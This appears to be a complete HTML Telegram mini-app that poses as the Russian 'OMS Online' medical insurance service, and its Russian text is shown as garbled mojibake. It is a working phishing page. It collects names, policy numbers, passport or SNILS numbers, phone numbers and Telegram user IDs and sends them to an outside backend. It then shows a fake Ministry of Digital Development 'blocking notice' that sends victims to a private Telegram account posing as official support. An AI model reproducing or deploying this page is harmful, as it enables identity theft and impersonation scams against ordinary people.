<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>–û–ú–° –û–Ω–ª–∞–π–Ω</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { margin: 0; font-family: system-ui, sans-serif; background: linear-gradient(to bottom, #eff6ff, #ffffff); min-height: 100vh; }
    .container { max-width: 480px; margin: 0 auto; padding: 20px; }
    .hidden { display: none !important; }
    .fade { animation: fadeIn 0.5s; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .blink { animation: blink 1.2s infinite; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    .glitch {
      animation: glitch 2s infinite;
      text-shadow: 2px 0 red, -2px 0 cyan;
    }
    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-2px, 2px); }
      40% { transform: translate(2px, -2px); }
      60% { transform: translate(-2px, 2px); }
      80% { transform: translate(2px, -2px); }
      100% { transform: translate(0); }
    }
    input[type="text"], input[type="tel"] {
      -webkit-appearance: none;
      -moz-appearance: textfield;
    }
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
  </style>
</head>
<body class="flex items-center justify-center">

  <div class="container bg-white rounded-2xl shadow-2xl p-8">

    <!-- –ü—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ -->
    <div id="welcome" class="text-center fade">
      <h1 class="text-3xl font-bold text-blue-800 mb-6">üëã –ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ!</h1>
      <p class="text-lg text-gray-700 mb-8 leading-relaxed">
        –Ø —Ü–∏—Ñ—Ä–æ–≤–æ–π –ø–æ–º–æ—â–Ω–∏–∫ —Å–µ—Ä–≤–∏—Å–∞ ¬´–û–ú–° –û–Ω–ª–∞–π–Ω¬ª.<br><br>
        –ú–æ—è –∑–∞–¥–∞—á–∞ ‚Äî –ø–æ–º–æ–≥–∞—Ç—å –≤–∞–º –±—ã—Å—Ç—Ä–æ –∏ —É–¥–æ–±–Ω–æ...<br><br>
        <b>‚ö†Ô∏è –í–∞–∂–Ω–æ!</b><br>
        –î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –º–µ–¥–∏—Ü–∏–Ω—Å–∫–æ–π –ø–æ–º–æ—â–∏ –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω—ã.<br>
        –≠—Ç–æ –∑–∞–π–º—ë—Ç –≤—Å–µ–≥–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç. üè•‚ú®
      </p>
      <button onclick="show('step1')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-xl font-medium shadow-lg hover:bg-blue-700">
        –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å
      </button>
    </div>

    <!-- –®–∞–≥ 1: –ü–æ–ª -->
    <div id="step1" class="hidden fade">
      <h2 class="text-2xl font-bold text-center mb-6">–ê–Ω–∫–µ—Ç–∞</h2>
      <h3 class="text-xl font-semibold mb-6">üëá –£–∫–∞–∂–∏—Ç–µ, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –í–∞—à –ø–æ–ª:</h3>
      <div class="grid grid-cols-2 gap-4">
        <button onclick="save('gender', '–ú—É–∂—Å–∫–æ–π'); show('step2')" class="bg-blue-100 hover:bg-blue-200 py-6 rounded-xl text-lg font-medium transition">–ú—É–∂—Å–∫–æ–π</button>
        <button onclick="save('gender', '–ñ–µ–Ω—Å–∫–∏–π'); show('step2')" class="bg-pink-100 hover:bg-pink-200 py-6 rounded-xl text-lg font-medium transition">–ñ–µ–Ω—Å–∫–∏–π</button>
      </div>
    </div>

    <!-- –®–∞–≥ 2: –§–ò–û -->
    <div id="step2" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">üìù –í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –§–ò–û:</h3>
      <input id="name" type="text" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" />
      <button onclick="saveInput('name', 'step3')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">–î–∞–ª–µ–µ</button>
    </div>

    <!-- –®–∞–≥ 3: –ü–æ–ª–∏—Å -->
    <div id="step3" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">–ù–æ–º–µ—Ä –í–∞—à–µ–≥–æ —Å—Ç—Ä–∞—Ö–æ–≤–æ–≥–æ –ø–æ–ª–∏—Å–∞:</h3>
      <input id="polis" type="text" placeholder="1234 567 890" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9 ]/g, '');" />
      <button onclick="saveInput('polis', 'step4')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">–î–∞–ª–µ–µ</button>
    </div>

    <!-- –®–∞–≥ 4: –í—ã–±–æ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
    <div id="step4" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ª–∏—á–Ω–æ—Å—Ç–∏ –≤—ã–±–µ—Ä–∏—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç:</h3>
      <div class="grid grid-cols-2 gap-4">
        <button onclick="save('docType', '–ü–∞—Å–ø–æ—Ä—Ç'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">–ü–∞—Å–ø–æ—Ä—Ç</button>
        <button onclick="save('docType', '–°–ù–ò–õ–°'); show('step5')" class="bg-gray-100 hover:bg-gray-200 py-6 rounded-xl text-lg transition">–°–ù–ò–õ–°</button>
      </div>
    </div>

    <!-- –®–∞–≥ 5: –ù–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞ -->
    <div id="step5" class="hidden fade">
      <h3 id="docTitle" class="text-xl font-semibold mb-6">–£–∫–∞–∂–∏—Ç–µ –Ω–æ–º–µ—Ä –¥–æ–∫—É–º–µ–Ω—Ç–∞:</h3>
      <input id="docNumber" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="—Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã" maxlength="11" class="w-full p-4 border rounded-xl text-lg mb-2 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="this.value = this.value.replace(/[^0-9]/g, '');" />
      <p id="docError" class="text-red-600 text-sm mb-4 hidden">–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç: –Ω—É–∂–Ω–æ —Ä–æ–≤–Ω–æ 10 –∏–ª–∏ 11 —Ü–∏—Ñ—Ä</p>
      <button onclick="validateDoc()" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">–î–∞–ª–µ–µ</button>
    </div>

    <!-- –®–∞–≥ 6: –¢–µ–ª–µ—Ñ–æ–Ω -->
    <div id="step6" class="hidden fade">
      <h3 class="text-xl font-semibold mb-6">–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</h3>
      <input id="phone" type="tel" inputmode="numeric" pattern="[0-9]*" placeholder="+7 (___) ___-__-__" class="w-full p-4 border rounded-xl text-lg mb-6 focus:outline-none focus:ring-2 focus:ring-blue-500" oninput="formatPhone(this)" maxlength="18" />
      <button onclick="saveInput('phone', 'check')" class="w-full bg-blue-600 text-white py-4 rounded-xl text-lg">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
    </div>

    <!-- –®–∞–≥ 7: –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö -->
    <div id="check" class="hidden fade">
      <h2 class="text-2xl font-bold text-center mb-6">–ü—Ä–æ–≤–µ—Ä—å—Ç–µ –¥–∞–Ω–Ω—ã–µ</h2>
      <div class="bg-gray-50 p-6 rounded-xl mb-6 text-left text-base leading-relaxed">
        <p><b>–ü–æ–ª:</b> <span id="prevGender"></span></p>
        <p><b>–§–ò–û:</b> <span id="prevName"></span></p>
        <p><b>–ü–æ–ª–∏—Å:</b> <span id="prevPolis"></span></p>
        <p><b>–î–æ–∫—É–º–µ–Ω—Ç:</b> <span id="prevDoc"></span></p>
        <p><b>–¢–µ–ª–µ—Ñ–æ–Ω:</b> <span id="prevPhone"></span></p>
      </div>
      <div class="grid grid-cols-2 gap-4">
        <button onclick="show('step6')" class="bg-gray-300 text-gray-800 py-4 rounded-xl text-lg">–ù–∞–∑–∞–¥</button>
        <button onclick="finish()" class="bg-green-600 text-white py-4 rounded-xl text-lg font-medium">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button>
      </div>
    </div>

    <!-- –≠–∫—Ä–∞–Ω –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ -->
    <div id="blocked" class="hidden fade text-center bg-red-50 p-8 rounded-2xl border-4 border-red-600 animate-pulse">
      <div class="text-6xl text-red-600 blink mb-6">!</div>
      <img src="https://i.imgur.com/–≤–∞—à–∞_–∫–∞—Ä—Ç–∏–Ω–∫–∞_–º–∏–Ω—Ü–∏—Ñ—Ä.jpg" alt="–ú–∏–Ω—Ü–∏—Ñ—Ä—ã" class="w-48 mx-auto mb-6 rounded-xl shadow-2xl">
      <h1 class="text-2xl font-bold text-red-800 mb-4 glitch">üá∑üá∫ –ú–ò–ù–¶–ò–§–†–´ ‚Äî –û–§–ò–¶–ò–ê–õ–¨–ù–û–ï –£–í–ï–î–û–ú–õ–ï–ù–ò–ï üá∑üá∫</h1>
      <p class="text-lg text-red-700 mb-8 leading-relaxed">
        ‚ö†Ô∏è <b>–í–ù–ò–ú–ê–ù–ò–ï!</b><br><br>
        –î–∞–Ω–Ω—ã–π –±–æ—Ç –±—ã–ª –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –∑–∞ –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–µ –≤ –º–æ—à–µ–Ω–Ω–∏—á–µ—Å–∫–æ–π –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ –∏ —É—Ç–µ—á–∫—É –ø–µ—Ä—Å–æ–Ω–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö.<br><br>
        üìû –û–∂–∏–¥–∞–π—Ç–µ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–æ–≥–æ –∑–≤–æ–Ω–∫–∞ –æ—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–µ–π –ú–∏–Ω—Ü–∏—Ñ—Ä –†–æ—Å—Å–∏–∏<br><br>
        –ï—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ —É—Å–∫–æ—Ä–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å, –º–æ–∂–µ—Ç–µ –Ω–∞–ø–∏—Å–∞—Ç—å –Ω–∞–ø—Ä—è–º—É—é –≤ –æ—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç –ú–∏–Ω—Ü–∏—Ñ—Ä –†–æ—Å—Å–∏–∏, –Ω–∞–∂–∞–≤ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.<br><br>
        üì© –í —Å–æ–æ–±—â–µ–Ω–∏–∏ –∫—Ä–∞—Ç–∫–æ –æ–ø–∏—à–∏—Ç–µ —á—Ç–æ –ø—Ä–æ–∏–∑–æ—à–ª–æ.<br><br>
        <i>–ú–∏–Ω—Ü–∏—Ñ—Ä—ã –†–æ—Å—Å–∏–∏ | –¶–µ–Ω—Ç—Ä –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –∏ —Ü–∏—Ñ—Ä–æ–≤–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</i>
      </p>
      <a href="https://t.me/kmdkdooo?text=–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ!%20–ú–æ–∏%20–¥–∞–Ω–Ω—ã–µ%20–ø–æ–ø–∞–ª–∏%20–≤%20–æ–±—â–∏–π%20–¥–æ—Å—Ç—É–ø,%20–ø—Ä–æ–∏–∑–æ—à–ª–æ%20–º–æ—à–µ–Ω–Ω–∏—á–µ—Å—Ç–≤–æ!%20–¢—Ä–µ–±—É–µ—Ç—Å—è%20–ø–æ–º–æ—â—å%20—Å–æ—Ç—Ä—É–¥–Ω–∏–∫–∞%20–æ–Ω–ª–∞–π–Ω-–ø–æ–¥–¥–µ—Ä–∂–∫–∏!" class="block w-full bg-blue-600 text-white py-4 rounded-xl text-lg font-medium shadow-lg hover:bg-blue-700">
        –ü–µ—Ä–µ–π—Ç–∏ –≤ —á–∞—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏
      </a>
    </div>

  </div>

  <script>
    let answers = {};
    let currentStep = 0;

    // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Ä–∞–∑–≤–æ—Ä–æ—Ç –Ω–∞ –≤–µ—Å—å —ç–∫—Ä–∞–Ω (—Ç–æ–ª—å–∫–æ –≤ –º–æ–±–∏–ª—å–Ω–æ–º Telegram)
    if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
      Telegram.WebApp.ready();
      Telegram.WebApp.expand();
      Telegram.WebApp.requestFullscreen();
    }

    function show(id) {
      document.querySelectorAll('#welcome, [id^="step"], #check, #blocked').forEach(el => el.classList.add('hidden'));
      document.getElementById(id).classList.remove('hidden');
      currentStep = parseInt(id.replace('step', '')) || 0;

      if (id === 'check') {
        document.getElementById('prevGender').textContent = answers.gender || '‚Äî';
        document.getElementById('prevName').textContent = answers.name || '‚Äî';
        document.getElementById('prevPolis').textContent = answers.polis || '‚Äî';
        document.getElementById('prevDoc').textContent = `${answers.docType || '‚Äî'} ${answers.docNumber || '‚Äî'}`;
        document.getElementById('prevPhone').textContent = answers.phone || '‚Äî';
      }
    }

    function save(key, value) {
      answers[key] = value;
    }

    function saveInput(id, next) {
      const val = document.getElementById(id).value.trim();
      if (!val) return alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –ø–æ–ª–µ!');
      save(id, val);
      show(next);
    }

    function formatPhone(input) {
      let value = input.value.replace(/\D/g, '');
      if (value.startsWith('7') || value.startsWith('8')) value = value.substring(1);
      let formatted = '+7';
      if (value.length > 0) formatted += ' (' + value.substring(0, 3);
      if (value.length > 3) formatted += ') ' + value.substring(3, 6);
      if (value.length > 6) formatted += '-' + value.substring(6, 8);
      if (value.length > 8) formatted += '-' + value.substring(8, 10);
      input.value = formatted.substring(0, 18);
    }

    function validateDoc() {
      const val = document.getElementById('docNumber').value.trim();
      const type = answers.docType;
      const error = document.getElementById('docError');
      const expectedLength = type === '–ü–∞—Å–ø–æ—Ä—Ç' ? 10 : 11;
      if (!val || val.length !== expectedLength) {
        error.textContent = `–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç: –Ω—É–∂–Ω–æ —Ä–æ–≤–Ω–æ ${expectedLength} —Ü–∏—Ñ—Ä`;
        error.classList.remove('hidden');
        return;
      }
      save('docNumber', val);
      error.classList.add('hidden');
      show('step6');
    }

    function finish() {
      const payload = {
        ...answers,
        userId: Telegram?.WebApp?.initDataUnsafe?.user?.id || '',
        username: Telegram?.WebApp?.initDataUnsafe?.user?.username || ''
      };

      console.log("–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ:", payload);

      const backendUrl = 'https://oms-mini-app-backend-production.up.railway.app/submit';

      fetch(backendUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
      .then(() => show('blocked'))
      .catch(err => {
        console.error(err);
        show('blocked');  // ‚Üê –≥–ª–∞–≤–Ω–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ ‚Äî –ø–æ–∫–∞–∑—ã–≤–∞–µ–º –±–ª–æ–∫–∏—Ä–æ–≤–∫—É –¥–∞–∂–µ –ø—Ä–∏ –æ—à–∏–±–∫–µ
      });
    }
  </script>
</body>
</html>
